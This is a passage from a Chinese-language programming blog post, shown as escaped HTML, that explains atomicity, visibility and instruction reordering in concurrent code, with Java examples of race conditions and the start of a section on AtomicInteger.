&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;			l&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Lock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;			a&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;br&gt;			l&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Unlock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;profiling 這段程式以後會發現 CPU 時間幾乎都花在 Lock 上面，下為 profiling 結果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable/lock-profiling.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;為了提升效能，保護單一變數在多個 thread 共用會用 lock-free 等手法。  而在撰寫 concurrency code 處理共享變數問題時，有三件事要注意：原子性 (atomicity)、可見性 (visibility) 以及有序性 (ordering)。&lt;/p&gt;
&lt;p&gt;本文就這三個議題，分別探討 Java 和 Golang 提供那些機制來處理，在此之前，我們先介紹一下這三個議題：&lt;/p&gt;
&lt;h2 id=&quot;%E5%8E%9F%E5%AD%90%E6%80%A7&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%8E%9F%E5%AD%90%E6%80%A7&quot;&gt;#&lt;/a&gt; 原子性&lt;/h2&gt;
&lt;p&gt;共用變數的操作需確保不會被中斷。一行程式碼可能由多個 cpu 指令組成，例如說 i++，就是由&lt;strong&gt;從變數取值&lt;/strong&gt;，&lt;strong&gt;值加一&lt;/strong&gt;，&lt;strong&gt;賦值回變數&lt;/strong&gt;三個 cpu 指令。若是兩個 thread 同時執行 i++ 時，cpu 指令執行順序可能是這樣交錯執行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;thread1 讀值 100  
thread2 讀值 100  
thread1 加一 101  
thread2 加一 101  
thread1 賦值 101  
thread2 賦值 101
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因此會得到一個錯誤的結果，i=101。&lt;/p&gt;
&lt;p&gt;一個簡單的 java 範例如下&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Atomic&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; times &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;100000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;ExecutorService&lt;/span&gt; executorService &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Executors&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newFixedThreadPool&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;Counter&lt;/span&gt; counter &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Counter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;times&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            executorService&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                counter&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        executorService&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;shutdown&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;counter&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Counter&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第 16 行預期應該顯示 100000，但實際執行往往少於 100000。這就是因為共享變數的存取沒有保持一致性導致的。&lt;/p&gt;
&lt;h2 id=&quot;%E5%8F%AF%E8%A6%8B%E6%80%A7&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%8F%AF%E8%A6%8B%E6%80%A7&quot;&gt;#&lt;/a&gt; 可見性&lt;/h2&gt;
&lt;p&gt;在多核環境，每個 CPU 都會有專屬自己的 cache，原本的用意是用來減少直接跟 memory 溝通的次數以提升效能。下圖即為一個簡單的 cpu架構示意圖。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable/cpu-architecture.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;這此架構下，同一個變數可能存在多個 cpu 快取中，若是 cpu1 更新了變數而 cpu2 毫無所知的話，cpu2 上的 thread 就會一直使用舊的值。&lt;br&gt;
下面是一段 java 範例：&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;Flag&lt;/span&gt; flag &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Flag&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt; t1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;flag&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;bool&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token comment&quot;&gt;// do nothing&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    t1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt; t2 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        flag&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;bool &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    t2&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    t1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Unreachable&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Flag&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;boolean&lt;/span&gt; bool &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;即使 thread 2 已經將 flag 更新為 false，但 thread 1 仍有一定機率會一直卡在 for loop 無法逃脫，因為 thread 1 沒看到 thread 2 對 flag 的更新。&lt;/p&gt;
&lt;h2 id=&quot;%E6%9C%89%E5%BA%8F%E6%80%A7&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%9C%89%E5%BA%8F%E6%80%A7&quot;&gt;#&lt;/a&gt; 有序性&lt;/h2&gt;
&lt;p&gt;編譯器在把程式碼轉成 cpu 指令的時候有時會因為效能因素重排指令，這會導致實際 cpu 執行指令的順序和你想像的不太一樣。例如下面三行 code：&lt;/p&gt;
&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;a = 1  &lt;br&gt;b = 2  &lt;br&gt;c = a + b&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第三行相依前兩行 code，因此 compile 只會保證前兩行在第三行前執行，亦即m是實際上執行順序可能會是&lt;/p&gt;
&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;b = 2  &lt;br&gt;a = 1  &lt;br&gt;c = a + b&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;這在 signle thread 是沒問題的，但在 multi thread 情況下亂序可能會造成你無法理解的 bug。以下是一個簡單的 Java code 範例：&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; a&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;b&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt; t1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            a&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            b&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        t1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; a&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;%th round, Non thread safe!&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;err&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;err&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;        t1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;是很有可能進入進入 12~16 行的 if condition 的，因為對 thread t1 而言 a=2 和 b=1 兩件事沒有 happen-before 關係，所以不會保證順序。&lt;/p&gt;
&lt;p&gt;上面提到的三個 concurrency 問題，其中可見性 (visibility) 和有序性(ordering) 通常一起通稱為 &lt;a href=&quot;https://en.wikipedia.org/wiki/Happened-before&quot;&gt;happen-before&lt;/a&gt; 原則。&lt;/p&gt;
&lt;p&gt;在實作 singleton 模式時常使用 “Double-checked locking” 來優化效能，此時若沒有意識到 happen-before 便會遇到問題：即使 singleton 物件非為 null 也不保證該物件處於初始化完成的狀態，因此有可能會讓系統異常，可參考 wiki 對此異常的&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E5%8F%8C%E9%87%8D%E6%A3%80%E6%9F%A5%E9%94%81%E5%AE%9A%E6%A8%A1%E5%BC%8F&quot;&gt;描述文章&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;接下來看看 Java 和 Golang 怎麼處理這些問題。&lt;/p&gt;
&lt;h1 id=&quot;java&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#java&quot;&gt;#&lt;/a&gt; Java&lt;/h1&gt;
&lt;h2 id=&quot;java-%E5%A6%82%E4%BD%95%E8%99%95%E7%90%86%E5%8E%9F%E5%AD%90%E6%80%A7%EF%BC%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#java-%E5%A6%82%E4%BD%95%E8%99%95%E7%90%86%E5%8E%9F%E5%AD%90%E6%80%A7%EF%BC%9F&quot;&gt;#&lt;/a&gt; Java 如何處理原子性？&lt;/h2&gt;
&lt;p&gt;Java 在 java.util.concurrent.atomic 裡面提供了原子性操作相關的 tool kit，用來保證變數的操作。例如可以用 &lt;strong&gt;AtomicInteger&lt;/strong&gt; 來處理對共享變數的操作，如此即可保證原子性不被破壞，得到正確的結果，修改過如下&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; times &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;100000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;ExecutorService&lt;/span&gt; executorService &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Executors&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newFixedThreadPool&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;token 